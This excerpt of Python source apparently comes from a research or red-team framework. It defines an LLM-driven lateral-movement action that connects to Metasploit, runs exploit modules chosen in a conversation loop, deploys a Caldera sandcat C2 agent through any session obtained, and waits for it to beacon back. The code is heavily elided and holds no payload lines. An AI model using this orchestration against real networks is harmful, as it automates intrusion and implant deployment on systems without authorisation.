...
from incalmo.core.actions.HighLevel.llm_agents.msf_lateral_movement.service import (
    MetasploitService,
)
...
class LLMLateralMoveMetasploit(LLMAgentAction):
    ...
    def from_params(
        ...
        if ess.metasploit_config is None:
            raise ValueError(
                "Metasploit is not configured. Add a 'metasploit' section to config.json."
            )

        src_host = ess.network.find_host_by_ip(params["src_host"])
        target_host = ess.network.find_host_by_ip(params["target_host"])

        msf_service = MetasploitService(ess.metasploit_config)
        msf_service.connect()
    ...
    async def run(
        ...
        # Substitute $server in the preprompt now that we know the C2 address
        ...
        for _ in range(self.MAX_CONVERSATION_LEN):
            ...
            # Check for <finished> before anything else
            ...
            try:
                if module_type == "exploit":
                    ...
                    if session_id:
                        # Deploy the Caldera sandcat agent through the session
                        deploy_output = self.metasploit_service.run_command_on_session(
                            session_id, sandcat_cmd
                        )

                        # Wait for the agent to beacon back to Caldera
                        await asyncio.sleep(_SANDCAT_BEACON_WAIT)

                        # Detect new Caldera agents on the target host
                    ...
                    # Requires an existing session; try to find one
